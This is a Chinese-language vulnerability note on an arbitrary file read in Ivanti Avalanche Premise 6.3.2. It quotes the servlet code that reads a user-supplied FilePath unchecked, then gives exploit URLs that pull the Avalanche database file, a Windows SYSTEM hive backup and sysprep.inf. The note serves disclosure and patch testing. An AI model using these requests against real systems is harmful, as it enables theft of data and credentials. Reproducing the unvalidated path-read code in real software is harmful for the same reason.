# Ivanti Avalanche目录便利任意文件漏洞读取.md

## 漏洞描述

Ivanti Avalanche是美国Ivanti公司的一套企业移动设备管理系统。该系统主要用于管理智能手机、平板电脑等设备。该漏洞存在于读取存储的头像图片位置，未进行限制格式与目录，造成了任意文件读取。

## 漏洞影响

> Avalanche Premise 6.3.2 for Windows v6.3.2.3490

## 关键代码

```
String paramImageFilePath = request.getParameter("FilePath"); // vulnerable GET parameter
boolean cacheImage = true;
String parameterIcon = request.getParameter("icon");
if (paramImageFilePath != null) {
  File File = new File(paramImageFilePath); // reading from user-input path
  byte[] icon = FileUtils.readFileToByteArray(File);
  String queryString = request.getQueryString();
  if (icon != null && icon.length > 0) {
    handleIcon(response, icon, queryString, false); // outputting the contents
  } else {
    logger.warn(String.format("ImageServlet::missing icon for device(%s)", new Object[] {
      queryString
    }));
  }
...
private void handleIcon(HttpServletResponse response, byte[] icon, String Source, boolean cacheImage) throws IOException {
    response.setContentLength(icon.length);
    if (cacheImage) {
      HttpUtils.expiresOneWeek(response);
    } else {
      HttpUtils.expiresNow(response);
    }
    ImageInputStream inputStream = ImageIO.createImageInputStream(new ByteArrayInputStream(icon));
    try {
      Iterator < ImageReader > Readers = ImageIO.getImageReaders(inputStream);
      if (Readers.hasNext()) {
        ImageReader reader = Readers.next();
        String formatName = reader.getFormatName();
        response.setContentType(String.format("/%s", new Object[] {
          formatName
        }));
      } else {
        logger.warn(String.format("ImageServlet::unknown  format for (%s)", new Object[] {
          Source
        }));
      }
    } finally {
      try {
        inputStream.close();
      } catch (IOException iOException) {}
    }
    ServletOutputStream outputStream = response.getOutputStream();
    outputStream.write(icon); // outputting the contents of the file
  }
```

从代码中可以看出文件的访问没有限制到存储位置，允许远程攻击者为在其他地方的文件提供完整的路径并检索其内容。

## EXP

访问路径https://IP:8443/AvalancheWeb/?FilePath=即可，例如下载DB，如下：

```
https://IP:8443/AvalancheWeb/?FilePath=C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/MSSQL/DATA/Avalanche.mdf
```

```
https://IP:8443/AvalancheWeb/?FilePath=C:/Windows/system32/config/system.sav
```

```
https://IP:8443/AvalancheWeb/?FilePath=C:/sysprep/sysprep.inf
```



